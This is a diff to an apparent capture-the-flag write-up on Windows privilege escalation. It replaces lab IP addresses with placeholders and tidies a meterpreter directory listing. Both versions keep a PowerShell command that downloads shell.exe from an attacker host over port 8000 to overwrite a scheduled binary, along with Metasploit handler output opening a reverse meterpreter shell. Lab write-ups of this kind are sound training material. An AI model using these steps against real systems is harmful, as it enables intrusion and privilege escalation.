@@ -449,24 +449,16 @@ meterpreter > dir
 Listing: c:\program files (x86)\systemscheduler\events
 ======================================================
 
-Mode          Size   Type  Last modified          Name
-----          ----   ----  -------------          ----
-100666/rw-rw  1961   fil   2026-04-20 19:45:34 +  20198415519.INI
--rw-                       0100
-100666/rw-rw  32045  fil   2026-04-20 19:45:34 +  20198415519.INI_LOG.t
--rw-                       0100                   xt
-100666/rw-rw  290    fil   2020-10-02 22:50:12 +  2020102145012.INI
--rw-                       0100
-100666/rw-rw  186    fil   2026-04-20 19:42:25 +  Administrator.flg
--rw-                       0100
-100666/rw-rw  182    fil   2026-04-20 19:42:23 +  SYSTEM_svc.flg
--rw-                       0100
-100666/rw-rw  0      fil   2026-04-20 18:00:30 +  Scheduler.flg
--rw-                       0100
-100666/rw-rw  449    fil   2026-04-20 19:42:25 +  SessionInfo.flg
--rw-                       0100
-100666/rw-rw  0      fil   2026-04-20 19:45:20 +  service.flg
--rw-                       0100
+Mode         		   Size   Type  Last modified          Name
+----          		   ----   ----  -------------          ----
+100666/rw-rw-rw- 0100  1961   fil   2026-04-20 19:45:34 +  20198415519.INI
+100666/rw-rw 0100      32045  fil   2026-04-20 19:45:34 +  20198415519.INI_LOG.t
+100666/rw-rw 0100      290    fil   2020-10-02 22:50:12 +  2020102145012.INI
+100666/rw-rw 0100      186    fil   2026-04-20 19:42:25 +  Administrator.flg
+100666/rw-rw 0100      182    fil   2026-04-20 19:42:23 +  SYSTEM_svc.flg
+100666/rw-rw 0100      0      fil   2026-04-20 18:00:30 +  Scheduler.flg
+100666/rw-rw 0100      449    fil   2026-04-20 19:42:25 +  SessionInfo.flg
+100666/rw-rw 0100      0      fil   2026-04-20 19:45:20 +  service.flg
 ```
 Here quick looks shows that 20198415519.INI_LOG.txt is of interest with message.exe running every minute.
 ```
@@ -494,7 +486,7 @@ Next replace the message.exe file with the shell.exe previously used:
 ## Two ways to run the powershell command one is:
 ```
 meterpreter> shell
-c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
+c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
 ```
 Or first load powershell to get powershell prompt: 
 ```
@@ -521,7 +513,7 @@ PS > dir mes*
 ...
 -a---         3/25/2018  10:58 AM     536992 message.bak
 ...
-PS > Invoke-WebRequest -Uri 'http://10.65.115.87:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\message.exe'
+PS > Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\message.exe'
 PS > dir mes* 
     Directory: C:\program files (x86)\SystemScheduler
 Mode                LastWriteTime     Length Name
@@ -532,9 +524,9 @@ Mode                LastWriteTime     Length Name
 Rerun the the listener exploit/multi/handler:
 ```
 msf6 exploit(multi/handler) > run
-[*] Started reverse TCP handler on 10.65.115.87:4444 
-[*] Sending stage (177734 bytes) to 10.65.176.189
-[*] Meterpreter session 2 opened (10.65.115.87:4444 -> 10.65.176.189:49605) at 2026-04-21 20:08:03 +0100
+[*] Started reverse TCP handler on <AttackBoxIP>:4444 
+[*] Sending stage (177734 bytes) <TargetIP>
+[*] Meterpreter session 2 opened (<AttackBoxIP>:4444 -> <TargetIP>:49605) at 2026-04-21 20:08:03 +0100
 
 meterpreter > shell
 Process 1712 created.
